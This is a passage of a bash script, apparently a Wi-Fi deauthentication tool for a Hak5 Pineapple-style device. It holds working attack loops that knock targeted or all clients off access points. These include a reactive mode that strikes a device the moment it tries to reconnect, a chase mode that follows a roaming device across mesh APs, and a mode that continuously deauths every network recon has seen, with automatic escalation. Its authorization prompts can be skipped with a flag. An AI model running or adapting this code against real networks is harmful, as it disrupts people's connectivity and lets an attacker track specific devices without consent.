# NOTE ON ORDER: narrows to auth/assoc-type lines FIRST, then checks each
# of those specific lines for the target's MAC - not the other way
# around. Checking the target's MAC first and stopping at its first
# match (e.g. via `grep -m1`) would find an unrelated Data/ACK frame
# (far more common than an auth attempt) and never look further, missing
# a real auth/assoc frame that shows up later in the same window.
PROVOKE_EVERY_N_CYCLES=5
run_reactive_strike() {
    track_foreground_pid
    local target="$1"; shift
    local pairs=("$@")
    MON_IFACE=""
    [ -e /sys/class/net/wlan1mon ] && MON_IFACE="wlan1mon"
    [ -z "$MON_IFACE" ] && [ -e /sys/class/net/wlan0mon ] && MON_IFACE="wlan0mon"
    if [ -z "$MON_IFACE" ]; then
        err "No monitor interface found - reactive strike mode needs one."
        return 1
    fi
    command -v tcpdump >/dev/null 2>&1 || { err "tcpdump not found - reactive strike mode needs it."; return 1; }

    local target_lc
    target_lc=$(echo "$target" | tr 'A-F' 'a-f')

    start_sentinel "$target" "${pairs[@]}" \
        && say "Sentinel active: internal radio watching a second channel simultaneously." \
        || say "No spare radio for a sentinel - watching with the primary radio only."

    say "Reactive strike: watching for $target's own reconnection attempts across ${#pairs[@]} AP(s), striking the instant one is seen..."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."

    local cycle=0
    while [ "$STOPPING" != "1" ]; do
        cycle=$((cycle + 1))
        # Sentinel check - cheap (just a file read), do it every cycle
        # before spending time on the primary radio's own watch window.
        if [ -s "$SENTINEL_STATE" ]; then
            local sighted
            sighted=$(cat "$SENTINEL_STATE" 2>/dev/null)
            rm -f "$SENTINEL_STATE"
            if [ -n "$sighted" ]; then
                local sb="${sighted%%~*}" sc="${sighted#*~}"
                say "Sentinel caught $target on $sb (ch $sc) - striking now."
                lock_channel "$sc" 3
                local i=1
                while [ "$i" -le "$((BURST * 2))" ]; do
                    PINEAPPLE_DEAUTH_CLIENT "$sb" "$target" "$sc"
                    i=$((i + 1))
                done
            fi
        fi
        # PROVOKE - manufacture reconnection events periodically instead
        # of only ever reacting to organic ones (see v2 comment above).
        if [ $((cycle % PROVOKE_EVERY_N_CYCLES)) = "0" ]; then
            local p
            for p in "${pairs[@]}"; do
                [ "$STOPPING" = "1" ] && break
                lock_channel "${p#*~}" 2
                PINEAPPLE_DEAUTH_CLIENT "${p%%~*}" "$target" "${p#*~}"
            done
        fi
        local pair
        for pair in "${pairs[@]}"; do
            [ "$STOPPING" = "1" ] && break
            local bssid="${pair%%~*}" channel="${pair#*~}"
            lock_channel "$channel" 3
            # Watch this AP's channel for up to 3s. "-l" line-buffers
            # tcpdump's output so grep sees each frame as it's printed,
            # not batched at buffer-flush/exit - matters here since we
            # want to react as fast as possible, not wait for the window
            # to end. "-e" prints the frame's link-layer addresses
            # (BSSID/DA/SA) on that same summary line - REQUIRED, not
            # optional: live-verified (synthetic pcap through this exact
            # tcpdump binary) that a management-frame summary line (auth/
            # assoc/reassoc) carries NO MAC address at all without it, so
            # the target-MAC grep just below would silently never match
            # ANY frame, no matter how long this watched - a complete,
            # silent failure of reactive mode's whole detection mechanism
            # that the frame-type keyword fix alone would NOT have caught
            # (that fix only corrected which lines get through the first
            # grep; this fixes the second grep having nothing to match
            # against at all). See the function-level comment above for
            # why the two greps are ordered frame-type-first, MAC-second.
            local hit
            hit=$(timeout 3 tcpdump -nn -e -l -i "$MON_IFACE" 2>/dev/null \
                | grep -iE "Authentication|Assoc Request|ReAssoc Request" \
                | grep -i "$target_lc")
            if [ -n "$hit" ]; then
                say "Caught $target reconnecting to $bssid (ch $channel) - striking now."
                lock_channel "$channel" 3
                local i=1
                while [ "$i" -le "$((BURST * 2))" ]; do
                    PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
                    i=$((i + 1))
                done
            fi
            # Re-check the sentinel between APs too, not just once per
            # full cycle - a 3s-per-AP watch window means a full cycle
            # over several APs could take 10s+, long enough for the
            # sentinel to catch something worth reacting to immediately
            # rather than waiting for the whole cycle to finish.
            if [ -s "$SENTINEL_STATE" ]; then
                local sighted2
                sighted2=$(cat "$SENTINEL_STATE" 2>/dev/null)
                rm -f "$SENTINEL_STATE"
                if [ -n "$sighted2" ]; then
                    local sb2="${sighted2%%~*}" sc2="${sighted2#*~}"
                    say "Sentinel caught $target on $sb2 (ch $sc2) - striking now."
                    lock_channel "$sc2" 3
                    local j=1
                    while [ "$j" -le "$((BURST * 2))" ]; do
                        PINEAPPLE_DEAUTH_CLIENT "$sb2" "$target" "$sc2"
                        j=$((j + 1))
                    done
                fi
            fi
        done
    done
    stop_sentinel
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
    say "Stopped."
}

# run_multi_bssid_loop TARGET "bssid~channel" ["bssid~channel" ...] -
# repeat PINEAPPLE_DEAUTH_CLIENT against EVERY AP in the list, every
# $INTERVAL seconds, until stopped. What --ssid / a grouped --pick
# selection uses to attack every AP sharing one SSID (e.g. a mesh
# network) in one continuous run, not just the first one.
run_multi_bssid_loop() {
    track_foreground_pid
    local target="$1"; shift
    local sorted pairs=() p
    sorted=$(sort_pairs_by_channel "$@")
    while IFS= read -r p; do [ -n "$p" ] && pairs+=("$p"); done <<< "$sorted"

    # Client-MAC discovery (see discover_clients()) - a ONE-TIME pre-pass
    # over every AP in this attack before the loop starts, not repeated
    # every round (that would multiply the ~2s-per-AP cost by every round
    # forever - too expensive to be worth it). Builds "bssid~channel~mac"
    # triples attacked directly alongside the normal broadcast pass below.
    local extra=() bssid channel found m extra_sorted
    if [ "$DISCOVER" = "1" ] && [ "$(echo "$target" | tr 'a-f' 'A-F')" = "FF:FF:FF:FF:FF:FF" ]; then
        say "Listening briefly on each of the ${#pairs[@]} AP('s) channel for real client MACs (one-time, ~2s per AP)..."
        for p in "${pairs[@]}"; do
            [ "$STOPPING" = "1" ] && break
            bssid="${p%%~*}"; channel="${p#*~}"
            lock_channel "$channel" 2
            found=$(discover_clients "$bssid")
            [ -z "$found" ] && continue
            while IFS= read -r m; do
                [ -n "$m" ] && extra+=("$bssid~$channel~$m")
            done <<< "$found"
        done
        if [ "${#extra[@]}" -gt 0 ]; then
            local total_found="${#extra[@]}"
            extra_sorted=$(sort_pairs_by_channel "${extra[@]}")
            extra=()
            while IFS= read -r p; do [ -n "$p" ] && extra+=("$p"); done <<< "$extra_sorted"
            # BUG FOUND AND FIXED (live-caught): per-AP discovery is
            # already capped (discover_clients()), but with several APs
            # each contributing their own capped list, the TOTAL can still
            # be large enough to blow up round time the same way an
            # uncapped per-AP list did (see discover_clients()'s own
            # comment for the live-measured "29 targets = 20-90s/round"
            # finding) - cap the combined list too, not just each AP's
            # individual contribution.
            if [ "${#extra[@]}" -gt 5 ]; then
                extra=("${extra[@]:0:5}")
                say "Found $total_found real client target(s) across ${#pairs[@]} AP(s) - capped to the first 5 to keep each round fast (see file comments)."
            else
                say "Found ${#extra[@]} real client target(s) across ${#pairs[@]} AP(s) - will target them directly too."
            fi
        else
            say "No additional client MACs discovered - continuing with broadcast target only."
        fi
    fi

    say "Deauthing $target across ${#pairs[@]} AP(s), burst of $BURST every ${INTERVAL}s..."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."

    # CHASE MODE (see file header) - only meaningful with a specific
    # target (not the FF:FF:FF:FF:FF:FF broadcast default, which already
    # hits every client of every AP each round - there's no single MAC to
    # "chase" there, and chasing would actually narrow coverage to ONE
    # device instead of hitting everyone, the opposite of what broadcast
    # mode is for). With a real target MAC, periodically re-locate which
    # AP it's actually on and prioritize attacking that one.
    local chase=0
    [ "$(echo "$target" | tr 'a-f' 'A-F')" != "FF:FF:FF:FF:FF:FF" ] && chase=1
    local last_known="" miss_streak=0
    local round_num=0

    while [ "$STOPPING" != "1" ]; do
        round_num=$((round_num + 1))
        if [ "$chase" = "1" ]; then
            local located="" ordered=() p2
            if [ -n "$last_known" ]; then
                # Cheap common case: check ONLY the last-known AP first -
                # if the target's still there, skip the expensive full
                # re-scan entirely this round.
                located=$(find_target_bssid "$target" "$last_known")
            fi
            if [ -z "$located" ]; then
                # Not confirmed at the last-known spot (or no location
                # yet) - re-scan the whole group to relocate. last_known
                # goes first (already just checked above, a harmless
                # repeat) so a genuine relocation is still found fast.
                if [ -n "$last_known" ]; then
                    ordered=("$last_known")
                    for p2 in "${pairs[@]}"; do [ "$p2" != "$last_known" ] && ordered+=("$p2"); done
                else
                    ordered=("${pairs[@]}")
                fi
                located=$(find_target_bssid "$target" "${ordered[@]}")
            fi
            if [ -n "$located" ]; then
                # UX FIX (found via live testing - a real chase run showed
                # ZERO status output the whole way through, no way to tell
                # if it ever actually located the target): this used to
                # only announce a CHANGE of location, staying silent on
                # the first-ever sighting - given the target's whole
                # location history starts unknown, that meant the single
                # most important confirmation ("yes, I found it") never
                # printed. Announce both first-sighting and every roam now.
                if [ "$located" != "$last_known" ]; then
                    if [ -n "$last_known" ]; then
                        say "Target roamed - now on ${located%%~*} (channel ${located#*~}), chasing."
                    else
                        say "Target located on ${located%%~*} (channel ${located#*~}) - chasing."
                    fi
                fi
                last_known="$located"
                miss_streak=0
                local lb="${located%%~*}" lc="${located#*~}"
                # Full-strength hit on the AP we KNOW the target is on
                # right now - guaranteed every round, unlike the light
                # pass below.
                lock_channel "$lc" 5
                burst_deauth "$lb" "$target" "$lc"
                # Light pass over the rest of the group too (single hit
                # each) - covers a mid-round roam without paying full
                # attack cost on APs it's probably NOT on.
                for p2 in "${pairs[@]}"; do
                    [ "$STOPPING" = "1" ] && break
                    [ "$p2" = "$located" ] && continue
                    lock_channel "${p2#*~}" 5
                    PINEAPPLE_DEAUTH_CLIENT "${p2%%~*}" "$target" "${p2#*~}"
                done
            else
                # UX FIX (found via live testing, same visibility gap as
                # above): silently falling back gave no signal the target
                # was never found at all. Announce once on the first miss
                # and again every 5th consecutive miss (not every round -
                # would spam the log for a genuinely offline/out-of-range
                # target) so "is this even working" has a real answer.
                miss_streak=$((miss_streak + 1))
                if [ "$miss_streak" = "1" ] || [ $((miss_streak % 5)) = "0" ]; then
                    say "Target not located this round (miss #$miss_streak) - broad sweep across all ${#pairs[@]} AP(s) instead."
                fi
                # Not located this round (out of range, asleep, or just
                # missed the brief listen window) - fall back to a full
                # pass over every AP so coverage doesn't drop to zero
                # while its location is unknown.
                attack_ap_pairs "$target" "${pairs[@]}"
            fi
        else
            # Broadcast target - hits every client of every AP each
            # round already (no single device to chase, and doing so
            # would narrow coverage to one device instead of everyone).
            attack_ap_pairs "$target" "${pairs[@]}"
            # DYNAMIC ESCALATION (see escalate_check() above): every
            # ESCALATE_EVERY_N_ROUNDS rounds, briefly re-check each AP for
            # still-active clients and bump burst pressure specifically
            # where it's measurably not working yet - "try normal first,
            # escalate what's not working", made concrete. Only on the
            # broadcast path (whole-range disruption) since that's what
            # this is actually for - chase mode above already adapts by
            # tracking location instead.
            if [ "$STOPPING" != "1" ] && [ $((round_num % ESCALATE_EVERY_N_ROUNDS)) = "0" ]; then
                escalate_check "${pairs[@]}"
            fi
        fi
        local triple tb trest tc tm
        for triple in "${extra[@]}"; do
            [ "$STOPPING" = "1" ] && break
            tb="${triple%%~*}"; trest="${triple#*~}"; tc="${trest%%~*}"; tm="${trest#*~}"
            # Fixed 5s margin (not $INTERVAL, which can be shorter than a
            # single burst's real-world timing) - same fix as
            # run_attack_loop/attack_ap_pairs above, same root cause.
            lock_channel "$tc" 5
            # DENSITY TUNED (live-measured): the primary broadcast pass
            # above still gets the full $BURST per AP - that's the pass
            # that matters most (hits EVERY client, not just the ones
            # discovery happened to catch). Discovered extras get a
            # single call each instead of a full burst - with up to 5 of
            # them, a full $BURST=3 each would nearly double round time
            # for a smaller marginal gain than just completing more
            # ROUNDS per minute does. One direct hit each, every round,
            # beats three hits every other round.
            PINEAPPLE_DEAUTH_CLIENT "$tb" "$tm" "$tc"
        done
        sleep "$INTERVAL" &
        wait $!
    done
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
    say "Stopped."
}

# run_all_loop - continuously re-scans recon.db for every AP it has seen
# ANY beacon from (not just ones with an already-fingerprinted client -
# see all_ap_pairs()) and deauths ALL of its clients via broadcast target,
# round after round, so APs that show up mid-attack get caught too - not
# just a single pass over whoever recon had already seen at the start.
run_all_loop() {
    track_foreground_pid
    say "Deauthing every AP recon has seen (broadcast target hits every client of it), burst of $BURST every ${INTERVAL}s..."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."
    local warned_empty=0
    local round_num=0
    while [ "$STOPPING" != "1" ]; do
        round_num=$((round_num + 1))
        local rows sorted pairs=() raw_bssid raw_channel
        rows=$(all_ap_pairs)
        if [ -z "$rows" ]; then
            [ "$warned_empty" = "0" ] && { err "No AP beacons seen by recon yet - will keep checking. Let recon run a bit longer, or use --bssid/--ssid for a specific known target."; warned_empty=1; }
        else
            warned_empty=0
            sorted=$(echo "$rows" | sort -t'~' -k2,2n)
            while IFS='~' read -r raw_bssid raw_channel; do
                [ -z "$raw_bssid" ] && continue
                is_dfs_channel "$raw_channel" && continue
                pairs+=("$(format_mac "$raw_bssid")~$raw_channel")
            done <<< "$sorted"
            if [ "${#pairs[@]}" -gt 0 ]; then
                attack_ap_pairs "FF:FF:FF:FF:FF:FF" "${pairs[@]}"
                # DYNAMIC ESCALATION - same mechanism as run_multi_bssid_loop's
                # broadcast path (see escalate_check() above): periodically
                # re-check which APs still have active clients despite being
                # attacked, and escalate burst pressure specifically there.
                if [ "$STOPPING" != "1" ] && [ $((round_num % ESCALATE_EVERY_N_ROUNDS)) = "0" ]; then
                    escalate_check "${pairs[@]}"
                fi
            fi
        fi
        sleep "$INTERVAL" &
        wait $!
    done
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
    say "Stopped."
}

# BIG CHANGE: the "is_running && die; background-launch; write PIDFILE;
# sleep 1; verify it's actually alive; report or die honestly" sequence
# below was duplicated, hand-copied, at all THREE attack-launch call sites
# (--all, --ssid/multi-pairs, single --bssid) - the exact kind of
# duplication that let real bugs (the missing tcpdump "-e" flag, the wrong
# frame-type labels) survive in some copies after already being fixed in
# others, earlier this session. One shared implementation now; only the
# loop function actually invoked (and its args) varies per call site.
# Usage: launch_attack FUNCTION_NAME [ARGS...] - FUNCTION_NAME is called by
# name (not eval'd as a string), so normal bash quoting/array-expansion at
# the call site works exactly as it did when each site built its own
# subshell inline.
launch_attack() {
    local fn="$1"; shift
    is_running && die "Already running (PID $(cat "$PIDFILE")). Use --stop first."
    if [ "$BACKGROUND" = "1" ]; then
        ( trap '' HUP; "$fn" "$@" ) >/tmp/pager-deauth.log 2>&1 &
        echo $! > "$PIDFILE"
        # BUG FOUND AND FIXED (found via code review, same class already
        # fixed this pass in sniff.sh/tracer.sh/PayloadRunner.sh/
        # bluetooth.sh/webui.sh): this printed "Started in background"
        # unconditionally with no check the loop actually survived - an
        # unexpected early death (a future regression, a genuinely unset
        # variable slipping past set -u from some path this file's own
        # extensive validation doesn't cover yet) would report success on
        # a subshell that's already gone.
        sleep 1
        if is_running; then
            say "Started in background (PID $(cat "$PIDFILE")). Use --stop to end it."
        else
            rm -f "$PIDFILE"
            die "Attack exited immediately - check /tmp/pager-deauth.log for why."
        fi
    else
        "$fn" "$@"
    fi
}

if [ "$DO_ALL" = "1" ]; then
    [ -f "$RECON_DB" ] || die "Recon database not found at $RECON_DB - has recon run yet?"
    command -v sqlite3 >/dev/null 2>&1 || die "sqlite3 not found on this device."
    if [ "$ASSUME_YES" != "1" ]; then
        confirm "Continuously deauth EVERY AP recon has seen (all their clients, via broadcast target), until stopped? Only do this on networks/clients you are authorized to test!" || die "Aborted."
    fi
    launch_attack run_all_loop
    exit 0
fi

if [ "${#MULTI_PAIRS[@]}" -gt 0 ]; then
    is_valid_mac "$TARGET" || die "'$TARGET' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff, or FF:FF:FF:FF:FF:FF for all clients) - check for a typo."
    if [ "$ASSUME_YES" != "1" ]; then
        if [ "$REACTIVE" = "1" ]; then
            confirm "Reactively strike $TARGET the instant it tries to reconnect, across ${#MULTI_PAIRS[@]} AP(s) broadcasting '$SSID_NAME', until stopped? Only run this against networks/clients you're authorized to test." || die "Aborted."
        else
            confirm "Continuously deauth $TARGET across ${#MULTI_PAIRS[@]} AP(s) broadcasting '$SSID_NAME' until stopped? Only run this against networks/clients you're authorized to test." || die "Aborted."
        fi
    fi
    if [ "$REACTIVE" = "1" ]; then
        launch_attack run_reactive_strike "$TARGET" "${MULTI_PAIRS[@]}"
    else
        launch_attack run_multi_bssid_loop "$TARGET" "${MULTI_PAIRS[@]}"
    fi
    exit 0
fi

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "== deauth.sh =="
    BSSID=$(ask "AP BSSID (MAC)" "$BSSID")
    CHANNEL=$(ask "Channel" "$CHANNEL")
fi
[ -z "$TARGET" ] && TARGET="FF:FF:FF:FF:FF:FF"

[ -z "$BSSID" ] || [ -z "$CHANNEL" ] && die "bssid and channel are required."
is_valid_mac "$BSSID" || die "'$BSSID' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff) - check for a typo."
is_valid_mac "$TARGET" || die "'$TARGET' doesn't look like a MAC address (expected aa:bb:cc:dd:ee:ff, or FF:FF:FF:FF:FF:FF for all clients) - check for a typo."
# BUG FOUND AND FIXED: CHANNEL only ever got a non-empty check, never a
# numeric one, on this path (--ssid/--all/--pick all source channels from
# recon's own integer column, but --bssid's channel comes straight from
# --channel/the interactive prompt, unchecked). is_dfs_channel() silently
# treats a non-numeric value as "not DFS" (its `-ge`/`-le` tests just fail
# quietly under 2>/dev/null) rather than flagging it, so a typo'd channel
# (e.g. a stray letter, or a pasted-in "6 " with trailing junk) would sail
# through every check and be handed straight to PINEAPPLE_EXAMINE_CHANNEL/
# PINEAPPLE_DEAUTH_CLIENT, which per this file's whole history of "wrong
# channel = silently transmits nothing" is exactly the failure mode to
# catch at the door instead of discovering as an attack that mysteriously
# never lands.
case "$CHANNEL" in ''|*[!0-9]*) die "'$CHANNEL' doesn't look like a channel number (expected a whole number like 6 or 36) - check for a typo." ;; esac
is_dfs_channel "$CHANNEL" && err "Channel $CHANNEL is a DFS channel - per Hak5's own docs, transmission is regulatorily blocked there, so this will send commands that succeed but never actually go out over the air. Continuing anyway since you gave this channel explicitly, but it will not work."

if [ "$ASSUME_YES" != "1" ]; then
    if [ "$REACTIVE" = "1" ]; then
        confirm "Reactively strike $TARGET the instant it tries to reconnect to $BSSID, until stopped? Only run this against networks/clients you're authorized to test." || die "Aborted."
    else
        confirm "Continuously deauth $TARGET from $BSSID until stopped? Only run this against networks/clients you're authorized to test." || die "Aborted."
    fi
fi

if [ "$REACTIVE" = "1" ]; then
    launch_attack run_reactive_strike "$TARGET" "$BSSID~$CHANNEL"
else
    launch_attack run_attack_loop "$BSSID" "$TARGET" "$CHANNEL"
fi
